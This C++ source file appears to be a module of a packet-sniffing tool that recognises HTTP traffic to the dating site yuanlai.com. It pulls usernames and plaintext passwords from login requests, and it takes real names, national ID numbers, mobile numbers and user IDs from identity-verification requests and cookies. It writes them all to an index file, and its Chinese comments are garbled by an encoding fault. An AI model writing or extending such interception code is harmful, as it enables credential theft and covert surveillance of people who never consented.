#include "StdAfx.h"
#include "MarriageYuanLai.h"

marriage::YuanLaiMarriage::YuanLaiMarriage(HttpSession *http_session, const string &pro_name) : Marriage(http_session,pro_name)
{
	app_ = "Ե����";	
}

marriage::YuanLaiMarriage::~YuanLaiMarriage()
{
	
}

int marriage::YuanLaiMarriage::IsYuanLaiMarriage(HttpSession *http_session)
{
	//��ҳ��¼
	if((http_session->m_Requestline.m_Host.Find("www.yuanlai.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/login/user-login.do")!=-1)) 
	{
		return kPcWebLogin;
	}
	//��ҳʵ����֤
	if((http_session->m_Requestline.m_Host.Find("www.yuanlai.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/profile/add-gzt-user-info.do")!=-1)) 
	{
		return kPcWebCheckName;
	}
	return 0;
}

int marriage::YuanLaiMarriage::Process(const char *packet,int action)
{
	//��ҳ��¼
	if (action == kPcWebLogin)
	{
		return PcWebLogin(packet);
	}
	//��ҳʵ����֤
	if (action == kPcWebCheckName)
	{
		return PcWebCheckName(packet);
	}
	return 1;
}
//��ҳ��¼
int marriage::YuanLaiMarriage::PcWebLogin(const char *packet)
{
    //���ݲ���
	string src_data(packet);
	ms_->SplitStringToMap(src_data,'&','=');
	//�û���
	string user = ms_->GetValueFromMapByKey("user",true);
	//����
	string password = ms_->GetValueFromMapByKey("password");	
	output_text_ =
		"user=" + user + "\r\n" +				//20	[13]	//�û��� 
		"pass=" +  password + "\r\n" + 			//21	[14]	//���� 	
		"netmark=" + app_ + "\r\n" + 		    //59	[124]	//��Դ
		"clientmsg=" + platformWeb + "\r\n" +   //62	[126]	//����ƽ̨
		"state=��¼\r\n";			            //64	[19]	//״̬
	WriteIndexFile();
	return 1;
}

//��ҳʵ����֤
int marriage::YuanLaiMarriage::PcWebCheckName(const char *packet)
{
	//��cookie ����ȡ����
	string cookie(http_session_->m_Requestline.m_Cookie.GetBuffer(0));
	ms_->SplitStringToMap(cookie,';','=');
	//�û���
	string userId = ms_->GetValueFromMapByKey("userId");
    //���ݲ���
	string src_data(packet);
	if (src_data.find("idNumber=") != string::npos)
	{
		src_data = src_data.substr(src_data.find("idNumber="));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	//����
	string name = ms_->GetValueFromMapByKey("name",true);
	//֤������
	string idType = "���֤";
	//֤����
	string idNumber = ms_->GetValueFromMapByKey("idNumber");
	//�ֻ���
	string mobile = ms_->GetValueFromMapByKey("mobile");
	
	output_text_ =
		"userid=" +		userId + "\r\n" + 			//28    [92]    //�û�ID
		"mid=" +		name + "\r\n" + 			//56	[121]	//����
		"servername=" + idType + "\r\n" + 			//49	[116]   //֤������      
		"appname=" +	idNumber + "\r\n" + 		//50	[115]   //֤����
		"oid=" +		mobile + "\r\n" + 			//54	[119]	//�ֻ��� 
		"netmark=" + app_ + "\r\n" + 				//59	[124]	//��Դ
		"clientmsg=" + platformWeb + "\r\n" +		//62	[126]	//����ƽ̨
		"state=ʵ����֤\r\n";						//64	[19]	//״̬
	WriteIndexFile();
	return 1;
}
